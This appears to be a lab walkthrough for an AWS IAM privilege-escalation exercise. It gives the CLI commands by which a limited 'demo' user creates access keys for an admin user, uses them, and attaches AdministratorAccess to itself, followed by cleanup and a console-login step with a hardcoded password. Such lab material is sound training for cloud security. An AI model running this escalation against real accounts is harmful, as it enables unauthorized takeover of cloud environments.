# Solutions / Walk through

Lets start off by viewing what permissions are attached to our user.

Run the following commands while authenticated as demo.

```sh
aws iam list-attached-user-policies --user-name demo

aws iam list-user-policies --user-name demo
```

We have already seen what ***consolePassword*** does, lets look what ***updateAccessKey*** does.

```sh
aws iam get-user-policy --user-name demo --policy-name updateAccessKey
```

```json
{
    "Action": [
        "iam:DeleteAccessKey",
        "iam:GetAccessKeyLastUsed",
        "iam:UpdateAccessKey",
        "iam:CreateAccessKey",
        "iam:ListAccessKeys"
    ],
    "Effect": "Allow",
    "Resource": "*"
}
```

It looks like the permission ***updateAccessKey*** grants us access to create and modify aws access keys.

Lets try to create an access key on another user.

```sh
aws iam list-users
```

Lets look more into the **jdoe** user.

```sh
aws iam get-user --user-name jdoe
```

```json
{
    "Path": "/admin/",
    "UserName": "jdoe",
    "UserId": "AIDAZ6IIT5XUV62LQOTF3",
    "Arn": "arn:aws:iam::683454754281:user/admin/jdoe",
    "CreateDate": "2022-02-19T17:29:22+00:00"
}
```

```sh
aws iam list-attached-user-policies --user-name jdoe
```

Look like they have admin access, lets see if we can create an access key for them.

```sh
aws iam list-access-keys --user-name jdoe

aws iam create-access-key --user-name jdoe | cat
```

Copy the outputs that look like similar to the following and past them into a new terminal shell.

```sh
# AccessKeyId
export AWS_ACCESS_KEY_ID=XXXXXXXXXX

# SecretAccessKey
export AWS_SECRET_ACCESS_KEY=YYYYYYYYYYYYYYYYY
```

Since they have admin we can give ourself admin as well.

```sh
aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name demo
```

Our user now has full iam permissions, lets give ourself administrative permissions.

```sh
aws iam list-attached-user-policies --user-name demo
```

The demo user now has administrator permissions in this aws account. ◻

## Cleanup

Lets remove the policies we attached and then let terraform do the rest.

```sh
aws iam detach-user-policy --user-name demo --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## AWS Console

All of the following can be done in the web console as well.

Run the following command.

```sh
aws iam create-login-profile --user-name demo --password 'My!User1Login8P@ssword'
```

Navigate to [console.aws.amazon.com](console.aws.amazon.com) choose IAM login, account id is in the terraform output [*account_id*], username is **demo** and password is **My!User1Login8P@ssword**
